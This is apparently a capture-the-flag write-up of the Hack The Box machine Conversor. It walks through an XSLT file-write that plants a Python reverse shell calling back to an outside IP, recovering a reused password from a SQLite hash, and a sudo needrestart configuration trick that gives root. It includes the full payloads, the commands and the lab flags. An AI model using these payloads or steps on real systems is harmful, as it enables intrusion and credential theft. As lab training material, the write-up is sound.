---
title: 0.2-Conversor
date: '2026-07-25'
category: ctf
description: ''
tags:
  - htb
draft: false
---

# Conversor: Turning an XML Conversion into a Root Shell

Conversor’s web application accepted an XML document and a user-supplied XSLT stylesheet, then returned an HTML conversion. That second input was the opening: the stylesheet could write a file into the application’s scripts directory. From the resulting web shell, I recovered a reused account password, and a permissive `sudo` rule completed the path to root.

## From upload feature to file write

The host `10.10.11.92` exposed SSH on port 22 and Apache on port 80. The site used the hostname `conversor.htb` and allowed me to register an account. After signing in, I could upload an XML file alongside an XSLT stylesheet; the application even provided a legitimate Nmap-to-HTML stylesheet as an example.

The XML document I supplied contained only a minimal root element:

~~~xml
<?xml version="1.0"?>
<ptswarm>test</ptswarm>
~~~

The interesting input was `malicious.xslt`. I used the XSLT processor’s document-writing extension to target `/var/www/conversor.htb/scripts/shell.py`. The Python content opened a callback to my listener:

~~~xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ptswarm="http://exslt.org/common"
    extension-element-prefixes="ptswarm"
    version="1.0">
  <xsl:template match="/">
    <ptswarm:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.70",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
    </ptswarm:document>
  </xsl:template>
</xsl:stylesheet>
~~~

I uploaded `pwn.xml` and the stylesheet and started `nc -lnvp 4444`. The application returned a converted file at `/view/90d10c10-ebb9-4e83-9443-6285522fecf4`; after I opened the result, the listener received a shell as `www-data`. The file write is visible in the payload and the callback is visible in the result. My notes do not show the application component that subsequently executed `shell.py`, so I cannot attribute that execution step to a particular job or request handler.

## Credentials in the application database

From the `www-data` shell, I inspected `/var/www/conversor.htb/instance/users.db`, a SQLite database belonging to the web application:

~~~bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
cd /var/www/conversor.htb/instance
sqlite3 users.db
.tables
select * from users;
~~~

The account that mattered for the next step was `fismathack`. Its stored MD5 digest was `5b5c3ac3a1c897c94caad48e6c71fdec`, which resolved to `Keepmesafeandwarm`. I had also found `fismathack` in `/etc/passwd` with an interactive shell. The recovered password worked over SSH:

~~~bash
ssh fismathack@10.10.11.92
~~~

That session gave me the user flag, `9773fc687356c539e45b3fb18ebf2f4a`. The database hash was not itself an SSH credential; password reuse connected the web account to the system account.

## Why the sudo rule led to root

Running `sudo -l` as `fismathack` showed permission to launch `/usr/sbin/needrestart` as root without a sudo password. The `-c` option selects a configuration file. As a first check, I pointed it at the root flag:

~~~bash
sudo /usr/sbin/needrestart -c /root/root.txt
~~~

The resulting Perl parsing error included the file’s contents, revealing `4df026a9d86b5fd11fe78399da329316`. That confirmed the command was reading the chosen path with elevated privileges. More seriously, `needrestart` evaluates its configuration as Perl code. I placed a Perl statement in a readable file and passed that file with `-c`:

~~~bash
cd /tmp
echo 'system("/bin/bash");' > shell
chmod +x shell
sudo /usr/sbin/needrestart -c /tmp/shell
~~~

The command returned a `root@conversor:/tmp#` prompt. The central issue was the `sudo` rule granting unrestricted configuration-file selection for a program that evaluates that file. Once `fismathack` could choose the file, the root-run process executed the contents as code.

Conversor combined two trust failures: an untrusted stylesheet could write into the application’s script area, and a root-run maintenance command accepted a configuration path controlled by an ordinary user. The first yielded `www-data`, the exposed database supplied a reused password, and the second yielded root.

Further reading: [needrestart’s configuration loading in its upstream source](https://github.com/liske/needrestart/blob/master/needrestart).
